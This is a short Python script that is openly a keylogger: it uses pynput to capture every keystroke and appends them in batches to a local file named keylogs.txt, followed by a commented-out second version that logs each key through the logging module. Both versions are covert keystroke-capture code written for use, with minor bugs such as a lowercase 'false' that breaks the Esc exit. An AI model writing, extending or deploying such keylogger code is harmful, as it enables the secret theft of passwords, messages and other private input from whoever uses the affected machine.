
from pynput.keyboard import Key, Listener

count=0
keys=[]
#C:\Users\Administrator\Documents\TEST\Tkinter_space

def on_press (key):
	global keys, count
	print("(0) pressed".format(key))

	keys.append(key)
	count+=1
	#print("{0} pressed".format{key})

	if count>=10:
		count=0
		write_file(keys)
		keys=[]

def on_release (key) :
	if key== Key.esc: 
		return false
def write_file(keys):
	with open("keylogs.txt","a") as f:
		for key in keys:
			f.write(str(key))

with Listener(on_press=on_press, on_release=on_release) as listener:
	 listener.join()







'''

from pynput.keyboard import Key, Listener
import logging

log_dir =""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG) #, format='%(asctime)s: %(message)s')

def on_press(key): 
	logging.info(str(key))

with Listener(on_press=on_press) as listener: listener.join ()
'''
